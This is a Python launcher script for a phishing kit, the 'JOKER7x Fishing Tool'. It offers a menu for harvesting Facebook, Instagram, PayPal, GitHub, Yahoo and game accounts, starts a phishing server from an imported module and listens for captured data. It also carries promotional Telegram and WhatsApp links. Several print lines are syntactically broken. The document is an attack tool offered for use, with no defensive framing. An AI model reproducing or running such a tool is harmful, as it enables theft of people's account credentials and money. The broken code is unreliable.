#!/usr/bin/python
#########################7x
import time, os, threading
from tools.Fishing.server import Fishing, db_File
from V7xStyle import Animation as A , G ,Text
from V7xStyle import Style
#########################7x
class App:
    @property
    def user(self):
        ######7x
        print ("\033[1;31m     _   _____   _   _    _____   _____         _____  __    __ 
        print ("\033[1;31m    | | /  _  \ | | / /  | ____| |  _  \       |___  | \ \  / / 
        print ("\033[0;31m    | | | | | | | |/ /   | |__   | |_| |           / /  \ \/ /  
        print ("\033[0;32m _  | | | | | | | |\ \   |  __|  |  _  /          / /    }  {   
        print ("\033[1;33m| |_| | | |_| | | | \ \  | |___  | | \ \         / /    / /\ \  
        print ("\033[1;31m\_____/ \_____/ |_|  \_\ |_____| |_|  \_\       /_/    /_/  \_\
        print (" ")
        print ("\033[1;32m  JOKER7x Fishing Tool  \033[1;36m  * _ *  \033[1;32m  Version: \033[1;31m1   \033[1;32m Date: \033[1;31m20-4-2020            ")
        print ("        ")
        SA = ['R#[G#1R#] C#FaceBook Accounts','R#[G#2R#] C#Instagram Accounts','R#[G#3R#] C#Paypal Accounts','R#[G#4R#] C#Github Accounts','R#[G#5R#] C#Yahoo Accounts','R#[G#6R#] C#Clash Of Clans Accounts','R#[G#7R#] C#PUBG Mobile Accounts','C#Available SoOoN..!'] 
        S = Style(*SA).Square(cols=2,padding_x=1,padding_y=1)
        print(S)
        ######7X
      print ("\033[1;36mfollow us on >>
        print ("\033[1;31mTelegram >> \033[1;33mhttps://t.me/J0KER_7x ")
        print ("\033[1;31mWhatApp >> \033[1;33https://chat.whatsapp.com/JoJ8DByy8x7L9NRlaBVVb7 ")
        text = Text('B#[C#*B#] Enter Number C#:W# ')
        page = input(text)
        try:
            page = int(page)
            templates = {
            1:'Facebook',
            2:'Instagram',
            3:'Paypal',
            4:'Github',
            5:'Yahoo',
            6:'Clash',
            7:'Pubg'
            }
            return templates[page]
        except:
            print('Command Not found!')
            return False

    def run(self,page):
        if page:
            try:
                F = Fishing(os.getcwd())
                F.start(page)
                F.listening(db_File)
                A.Loading(text=G+'[*] Server is Running...',repeat=99999)
            except KeyboardInterrupt:
                exit('\rGood bye :D'+' '*20)

if __name__ == '__main__':
    app = App()
    page = app.user
    app.run(page)
